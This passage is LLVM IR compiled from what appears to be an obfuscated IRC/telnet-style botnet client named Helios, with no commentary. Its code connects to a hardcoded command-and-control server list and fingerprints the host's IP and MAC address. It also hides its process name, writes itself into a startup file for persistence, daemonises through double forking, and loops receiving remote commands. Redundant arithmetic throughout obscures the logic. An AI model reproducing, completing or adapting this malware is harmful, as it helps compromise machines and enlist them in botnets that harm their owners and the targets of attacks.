  %523 = sub i64 %522, 3203125828764146177
  %524 = add i64 %523, 1
  %525 = add i64 %524, 3203125828764146177
  %526 = add i64 %522, 1
  store i64 %525, i64* %30, align 8
  br label %491

; <label>:527:                                    ; preds = %491
  br label %528

; <label>:528:                                    ; preds = %527, %484, %478, %443, %346, %294, %206, %106, %102, %75, %70, %65, %52, %36
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @HeliosCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @HeliosCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @HeliosCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add i32 %11, -229377929
  %13 = add i32 %12, 1
  %14 = sub i32 %13, -229377929
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = icmp eq i64 %16, 1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %25

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @currentServer, align 4
  %21 = sub i32 %20, 919036385
  %22 = add i32 %21, 1
  %23 = add i32 %22, 919036385
  %24 = add nsw i32 %20, 1
  store i32 %23, i32* @currentServer, align 4
  br label %25

; <label>:25:                                     ; preds = %19, %18
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %27 = load i32, i32* @currentServer, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [1 x i8*], [1 x i8*]* @AllDemDupes, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcpy(i8* %26, i8* %30) #2
  store i32 666, i32* %3, align 4
  %32 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %33 = call i8* @strchr(i8* %32, i32 58) #10
  %34 = icmp ne i8* %33, null
  br i1 %34, label %35, label %42

; <label>:35:                                     ; preds = %25
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %37 = call i8* @strchr(i8* %36, i32 58) #10
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = call i32 @atoi(i8* %38) #10
  store i32 %39, i32* %3, align 4
  %40 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %41 = call i8* @strchr(i8* %40, i32 58) #10
  store i8 0, i8* %41, align 1
  br label %42

; <label>:42:                                     ; preds = %35, %25
  %43 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %43, i32* @HeliosCommSock, align 4
  %44 = load i32, i32* @HeliosCommSock, align 4
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @connectTimeout(i32 %44, i8* %45, i32 %46, i32 30)
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  store i32 1, i32* %1, align 4
  br label %51

; <label>:50:                                     ; preds = %42
  store i32 0, i32* %1, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.406, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.407, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.408, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, -1
  %50 = and i32 713479291, %49
  %51 = xor i32 713479291, -1
  %52 = and i32 %47, %51
  %53 = xor i32 %48, -1
  %54 = and i32 %53, 713479291
  %55 = and i32 %48, %51
  %56 = or i32 %50, %52
  %57 = or i32 %54, %55
  %58 = xor i32 %56, %57
  %59 = xor i32 %47, %48
  call void @srand(i32 %58) #2
  %60 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %61 = call i32 @getpid() #2
  %62 = xor i32 %60, -1
  %63 = and i32 %61, %62
  %64 = xor i32 %61, -1
  %65 = and i32 %60, %64
  %66 = or i32 %63, %65
  %67 = xor i32 %60, %61
  call void @init_rand(i32 %66)
  store i32 0, i32* %10, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.410, i32 0, i32 0), i8** %12, align 8
  %68 = load i8*, i8** %12, align 8
  %69 = call %struct._IO_FILE* @fopen(i8* %68, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store %struct._IO_FILE* %69, %struct._IO_FILE** %13, align 8
  %70 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %71 = icmp eq %struct._IO_FILE* %70, null
  br i1 %71, label %72, label %75

; <label>:72:                                     ; preds = %2
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.412, i32 0, i32 0), i8** %12, align 8
  %73 = load i8*, i8** %12, align 8
  %74 = call %struct._IO_FILE* @fopen(i8* %73, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store %struct._IO_FILE* %74, %struct._IO_FILE** %13, align 8
  br label %75

; <label>:75:                                     ; preds = %72, %2
  %76 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %77 = icmp ne %struct._IO_FILE* %76, null
  br i1 %77, label %78, label %168

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 0
  %81 = load i8*, i8** %80, align 8
  %82 = call i64 @strlen(i8* %81) #10
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %84 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %85 = call i8* @getcwd(i8* %84, i64 256) #2
  %86 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %87 = call i32 @strcmp(i8* %86, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.413, i32 0, i32 0)) #10
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %89, label %164

; <label>:89:                                     ; preds = %78
  br label %90

; <label>:90:                                     ; preds = %100, %89
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 0
  %93 = load i8*, i8** %92, align 8
  %94 = load i32, i32* %16, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = sext i8 %97 to i32
  %99 = icmp ne i32 %98, 47
  br i1 %99, label %100, label %107

; <label>:100:                                    ; preds = %90
  %101 = load i32, i32* %16, align 4
  %102 = sub i32 0, %101
  %103 = sub i32 0, -1
  %104 = add i32 %102, %103
  %105 = sub i32 0, %104
  %106 = add nsw i32 %101, -1
  store i32 %105, i32* %16, align 4
  br label %90

; <label>:107:                                    ; preds = %90
  %108 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %109 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %110 = load i8**, i8*** %5, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 0
  %112 = load i8*, i8** %111, align 8
  %113 = load i32, i32* %16, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = call i32 (i8*, i8*, ...) @sprintf(i8* %108, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.414, i32 0, i32 0), i8* %109, i8* %115) #2
  br label %117

; <label>:117:                                    ; preds = %142, %107
  %118 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %119 = call i32 @feof(%struct._IO_FILE* %118) #2
  %120 = icmp ne i32 %119, 0
  %121 = xor i1 %120, true
  %122 = and i1 true, %121
  %123 = xor i1 true, true
  %124 = and i1 %120, %123
  %125 = or i1 %122, %124
  %126 = xor i1 %120, true
  br i1 %125, label %127, label %143

; <label>:127:                                    ; preds = %117
  %128 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %129 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %130 = call i8* @fgets(i8* %128, i32 1024, %struct._IO_FILE* %129)
  %131 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %132 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %133 = call i32 @strcasecmp(i8* %131, i8* %132) #10
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %142, label %135

; <label>:135:                                    ; preds = %127
  %136 = load i32, i32* %17, align 4
  %137 = sub i32 0, %136
  %138 = sub i32 0, 1
  %139 = add i32 %137, %138
  %140 = sub i32 0, %139
  %141 = add nsw i32 %136, 1
  store i32 %140, i32* %17, align 4
  br label %142

; <label>:142:                                    ; preds = %135, %127
  br label %117

; <label>:143:                                    ; preds = %117
  %144 = load i32, i32* %17, align 4
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %146, label %160

; <label>:146:                                    ; preds = %143
  %147 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %148 = call i32 @fclose(%struct._IO_FILE* %147)
  %149 = load i8*, i8** %12, align 8
  %150 = call %struct._IO_FILE* @fopen(i8* %149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.415, i32 0, i32 0))
  store %struct._IO_FILE* %150, %struct._IO_FILE** %18, align 8
  %151 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %152 = icmp ne %struct._IO_FILE* %151, null
  br i1 %152, label %153, label %159

; <label>:153:                                    ; preds = %146
  %154 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %155 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %156 = call i32 @fputs(i8* %154, %struct._IO_FILE* %155)
  %157 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %158 = call i32 @fclose(%struct._IO_FILE* %157)
  br label %159

; <label>:159:                                    ; preds = %153, %146
  br label %163

; <label>:160:                                    ; preds = %143
  %161 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %162 = call i32 @fclose(%struct._IO_FILE* %161)
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br label %167

; <label>:164:                                    ; preds = %78
  %165 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %166 = call i32 @fclose(%struct._IO_FILE* %165)
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br label %168

; <label>:168:                                    ; preds = %167, %75
  %169 = call i32 @getOurIP()
  %170 = call i32 @fork() #2
  store i32 %170, i32* %7, align 4
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %172, label %175

; <label>:172:                                    ; preds = %168
  %173 = load i32, i32* %7, align 4
  %174 = call i32 @waitpid(i32 %173, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:175:                                    ; preds = %168
  %176 = load i32, i32* %7, align 4
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %190, label %178

; <label>:178:                                    ; preds = %175
  %179 = call i32 @fork() #2
  store i32 %179, i32* %8, align 4
  %180 = icmp ne i32 %179, 0
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %178
  call void @exit(i32 0) #14
  unreachable

; <label>:182:                                    ; preds = %178
  %183 = load i32, i32* %8, align 4
  %184 = icmp ne i32 %183, 0
  br i1 %184, label %186, label %185

; <label>:185:                                    ; preds = %182
  br label %188

; <label>:186:                                    ; preds = %182
  %187 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  br label %188

; <label>:188:                                    ; preds = %186, %185
  br label %189

; <label>:189:                                    ; preds = %188
  br label %192

; <label>:190:                                    ; preds = %175
  %191 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  br label %192

; <label>:192:                                    ; preds = %190, %189
  br label %193

; <label>:193:                                    ; preds = %192
  %194 = call i32 @setsid() #2
  %195 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.413, i32 0, i32 0)) #2
  %196 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %197

; <label>:197:                                    ; preds = %543, %200, %193
  %198 = call i32 @initConnection()
  %199 = icmp ne i32 %198, 0
  br i1 %199, label %200, label %202

; <label>:200:                                    ; preds = %197
  %201 = call i32 @sleep(i32 30)
  br label %197

; <label>:202:                                    ; preds = %197
  %203 = load i32, i32* @HeliosCommSock, align 4
  %204 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %205 = call i8* @inet_ntoa(i32 %204) #2
  %206 = call i8* @getBuild()
  %207 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %203, i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.417, i32 0, i32 0), i8* %205, i8* %206)
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  br label %208

; <label>:208:                                    ; preds = %542, %451, %364, %319, %202
  %209 = load i32, i32* @HeliosCommSock, align 4
  %210 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %211 = call i32 @recvLine(i32 %209, i8* %210, i32 4096)
  store i32 %211, i32* %20, align 4
  %212 = icmp ne i32 %211, -1
  br i1 %212, label %213, label %543

; <label>:213:                                    ; preds = %208
  store i32 0, i32* %21, align 4
  br label %214

; <label>:214:                                    ; preds = %303, %213
  %215 = load i32, i32* %21, align 4
  %216 = sext i32 %215 to i64
  %217 = load i64, i64* @numpids, align 8
  %218 = icmp ult i64 %216, %217
  br i1 %218, label %219, label %310

; <label>:219:                                    ; preds = %214
  %220 = load i32*, i32** @pids, align 8
  %221 = load i32, i32* %21, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds i32, i32* %220, i64 %222
  %224 = load i32, i32* %223, align 4
  %225 = call i32 @waitpid(i32 %224, i32* null, i32 1)
  %226 = icmp sgt i32 %225, 0
  br i1 %226, label %227, label %302

; <label>:227:                                    ; preds = %219
  %228 = load i32, i32* %21, align 4
  %229 = sub i32 0, 1
  %230 = sub i32 %228, %229
  %231 = add nsw i32 %228, 1
  store i32 %230, i32* %23, align 4
  br label %232

; <label>:232:                                    ; preds = %251, %227
  %233 = load i32, i32* %23, align 4
  %234 = zext i32 %233 to i64
  %235 = load i64, i64* @numpids, align 8
  %236 = icmp ult i64 %234, %235
  br i1 %236, label %237, label %257

; <label>:237:                                    ; preds = %232
  %238 = load i32*, i32** @pids, align 8
  %239 = load i32, i32* %23, align 4
  %240 = zext i32 %239 to i64
  %241 = getelementptr inbounds i32, i32* %238, i64 %240
  %242 = load i32, i32* %241, align 4
  %243 = load i32*, i32** @pids, align 8
  %244 = load i32, i32* %23, align 4
  %245 = add i32 %244, -677339725
  %246 = sub i32 %245, 1
  %247 = sub i32 %246, -677339725
  %248 = sub i32 %244, 1
  %249 = zext i32 %247 to i64
  %250 = getelementptr inbounds i32, i32* %243, i64 %249
  store i32 %242, i32* %250, align 4
  br label %251

; <label>:251:                                    ; preds = %237
  %252 = load i32, i32* %23, align 4
  %253 = sub i32 %252, -1610759331
  %254 = add i32 %253, 1
  %255 = add i32 %254, -1610759331
  %256 = add i32 %252, 1
  store i32 %255, i32* %23, align 4
  br label %232

; <label>:257:                                    ; preds = %232
  %258 = load i32*, i32** @pids, align 8
  %259 = load i32, i32* %23, align 4
  %260 = sub i32 0, 1
  %261 = add i32 %259, %260
  %262 = sub i32 %259, 1
  %263 = zext i32 %261 to i64
  %264 = getelementptr inbounds i32, i32* %258, i64 %263
  store i32 0, i32* %264, align 4
  %265 = load i64, i64* @numpids, align 8
  %266 = sub i64 0, %265
  %267 = sub i64 0, -1
  %268 = add i64 %266, %267
  %269 = sub i64 0, %268
  %270 = add i64 %265, -1
  store i64 %269, i64* @numpids, align 8
  %271 = load i64, i64* @numpids, align 8
  %272 = sub i64 0, 1
  %273 = sub i64 %271, %272
  %274 = add i64 %271, 1
  %275 = mul i64 %273, 4
  %276 = call noalias i8* @malloc(i64 %275) #2
  %277 = bitcast i8* %276 to i32*
  store i32* %277, i32** %22, align 8
  store i32 0, i32* %23, align 4
  br label %278

; <label>:278:                                    ; preds = %293, %257
  %279 = load i32, i32* %23, align 4
  %280 = zext i32 %279 to i64
  %281 = load i64, i64* @numpids, align 8
  %282 = icmp ult i64 %280, %281
  br i1 %282, label %283, label %298

; <label>:283:                                    ; preds = %278
  %284 = load i32*, i32** @pids, align 8
  %285 = load i32, i32* %23, align 4
  %286 = zext i32 %285 to i64
  %287 = getelementptr inbounds i32, i32* %284, i64 %286
  %288 = load i32, i32* %287, align 4
  %289 = load i32*, i32** %22, align 8
  %290 = load i32, i32* %23, align 4
  %291 = zext i32 %290 to i64
  %292 = getelementptr inbounds i32, i32* %289, i64 %291
  store i32 %288, i32* %292, align 4
  br label %293

; <label>:293:                                    ; preds = %283
  %294 = load i32, i32* %23, align 4
  %295 = sub i32 0, 1
  %296 = sub i32 %294, %295
  %297 = add i32 %294, 1
  store i32 %296, i32* %23, align 4
  br label %278

; <label>:298:                                    ; preds = %278
  %299 = load i32*, i32** @pids, align 8
  %300 = bitcast i32* %299 to i8*
  call void @free(i8* %300) #2
  %301 = load i32*, i32** %22, align 8
  store i32* %301, i32** @pids, align 8
  br label %302

; <label>:302:                                    ; preds = %298, %219
  br label %303

; <label>:303:                                    ; preds = %302
  %304 = load i32, i32* %21, align 4
  %305 = sub i32 0, %304
  %306 = sub i32 0, 1
  %307 = add i32 %305, %306
  %308 = sub i32 0, %307
  %309 = add nsw i32 %304, 1
  store i32 %308, i32* %21, align 4
  br label %214

; <label>:310:                                    ; preds = %214
  %311 = load i32, i32* %20, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %312
  store i8 0, i8* %313, align 1
  %314 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %314)
  %315 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %316 = call i8* @strstr(i8* %315, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0)) #10
  %317 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %318 = icmp eq i8* %316, %317
  br i1 %318, label %319, label %320

; <label>:319:                                    ; preds = %310
  br label %208

; <label>:320:                                    ; preds = %310
  %321 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %322 = call i8* @strstr(i8* %321, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.418, i32 0, i32 0)) #10
  %323 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %324 = icmp eq i8* %322, %323
  br i1 %324, label %325, label %335

; <label>:325:                                    ; preds = %320
  %326 = load i32, i32* %10, align 4
  %327 = sub i32 0, 1
  %328 = sub i32 %326, %327
  %329 = add nsw i32 %326, 1
  store i32 %328, i32* %10, align 4
  %330 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.419, i32 0, i32 0))
  %331 = load i32, i32* %10, align 4
  %332 = icmp sgt i32 %331, 20
  br i1 %332, label %333, label %334

; <label>:333:                                    ; preds = %325
  call void @exit(i32 0) #14
  unreachable

; <label>:334:                                    ; preds = %325
  br label %543

